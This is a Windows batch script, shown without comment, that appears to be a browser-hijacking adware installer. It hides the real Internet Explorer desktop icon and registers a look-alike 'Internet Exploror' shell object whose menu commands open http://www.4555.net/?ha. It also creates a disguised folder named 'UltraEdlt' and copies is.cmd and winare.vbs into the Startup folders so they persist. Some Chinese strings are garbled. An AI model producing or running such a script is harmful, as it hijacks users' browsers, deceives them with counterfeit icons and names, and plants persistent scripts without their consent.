REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel" /v "{871C5380-42A0-1069-A2EA-08002B30309D}" /t REG_DWORD  /d 1  /f
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}"
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}" /v "InfoTip" /t REG_SZ /d "���Ҳ���ʾ Internet �ϵ���Ϣ����վ" /f
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}" /v "LocalizedString" /t REG_SZ /d "Internet Exploror" /f
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\DefaultIcon" 
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\DefaultIcon" /ve /t REG_EXPAND_SZ /d "shdoclc.dll,0" /f
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\InProcServer32" 
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\InProcServer32" /ve /t REG_SZ /d "%%systemRoot%%\system32\shdocvw.dll" /f
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\InProcServer32"  /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\shell" 
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\shell" /ve /t REG_SZ /d "����ҳ(&H)" /f	
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\shell\����ҳ(&H)" 
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\shell\����ҳ(&H)" /v "MUIVerb" /t REG_SZ /d "@shdoclc.dll,-10241" /f		
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\shell\����ҳ(&H)\Command" 
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\shell\����ҳ(&H)\Command" /ve /t REG_SZ /d "C:\progra~1\Intern~1\iexplore.exe http://www.4555.net/?ha" /f
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\shell\����(&R)" 	
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\shell\����(&R)\Command" 
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\shell\����(&R)\Command"  /ve /t REG_SZ /d "C:\progra~1\Intern~1\iexplore.exe http://www.4555.net/?ha" /f
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\ShellFolder" 
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\ShellFolder" /v "Attributes" /t REG_DWORD /d 0 /f
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\ShellFolder" /v "HideFolderVerbs" /t REG_SZ /d "" /f
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\ShellFolder" /v "HideOnDesktopPerUser" /t REG_SZ /d "" /f
REG ADD "HKEY_CLASSES_ROOT\CLSID\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\ShellFolder" /v "WantsParsDisplayName" /t REG_SZ /d "" /f
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"  /v  "NoInternetIcon"  /t  REG_DWORD  /d 1 /f
mkdir     "C:\Windows\Mail\UltraEdlt\"
copy ".\is.cmd"          "C:\Windows\Mail\UltraEdlt\is.cmd"
copy ".\winare.vbs"      "C:\Windows\Mail\UltraEdlt\winare.vbs"
copy ".\winare.vbs"   "%ALLUSERSPROFILE%\����ʼ���˵�\����\����\winare.vbs"
copy ".\winare.vbs"           "%USERPROFILE%\����ʼ���˵�\����\����\winare.vbs"